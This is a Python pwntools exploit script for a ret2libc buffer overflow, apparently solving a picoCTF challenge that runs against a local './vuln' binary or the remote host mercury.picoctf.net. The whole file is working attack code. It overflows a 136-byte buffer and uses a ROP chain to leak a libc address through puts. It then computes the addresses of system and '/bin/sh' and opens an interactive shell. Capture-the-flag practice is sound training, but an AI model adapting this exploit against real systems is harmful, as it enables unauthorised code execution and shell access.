#!/usr/bin/env python3
import argparse
from pwn import *

def parse_args():
    parser = argparse.ArgumentParser(description="An exploit for a ret2libc.")
    parser.add_argument(
        "mode",
        choices=["local", "remote"],
        help="Choose the mode to run the script: 'local' for testing locally or 'remote' for remote exploitation."
    )
    return parser.parse_args()

def exploit(process):
    """
    Performs the exploitation process using the provided process object.
    """
    offset = 136
    junk = b"A" * offset

    # Addresses and offsets
    pop_rdi = 0x400913
    setbuf_at_got = 0x601028
    puts_at_plt = 0x400540
    back_to_main = 0x400771
    setbuf_offset = 0x88540
    system_offset = 0x4F4E0
    bin_sh_offset = 0x1B40FA
    ret_instruction = 0x40052E

    # First payload to leak the libc address
    payload = [
        junk,
        p64(pop_rdi),
        p64(setbuf_at_got),
        p64(puts_at_plt),
        p64(back_to_main)
    ]
    payload = b"".join(payload)
    process.sendline(payload)

    process.recvline()
    process.recvline()
    log.info(f"Buffer overflow succeeded!")

    # Leak libc address
    leak = u64(process.recvline().strip().ljust(8, b"\x00"))
    log.info(f"Leaked address: {hex(leak)}")

    # Calculate libc base address and required function/variable addresses
    base_address_of_libc = leak - setbuf_offset
    log.info(f"Base address of LIBC: {hex(base_address_of_libc)}")

    system_address = base_address_of_libc + system_offset
    bin_sh_address = base_address_of_libc + bin_sh_offset

    # Second payload to spawn a shell
    second_payload = [
        junk,
        p64(pop_rdi),
        p64(bin_sh_address),
        p64(ret_instruction),  # Stack alignment
        p64(system_address),
    ]
    second_payload = b"".join(second_payload)
    process.sendline(second_payload)

    # Switch to interactive mode
    process.interactive()

def main():
    args = parse_args()

    if args.mode == "local":
        process_instance = process("./vuln")
    else:
        process_instance = remote("mercury.picoctf.net", 1774)

    exploit(process_instance)

if __name__ == "__main__":
    try:
        main()
    except SystemExit as e:
        print("\n[!] Please provide a valid argument: 'local' or 'remote'. Use --help for more information.")
        raise
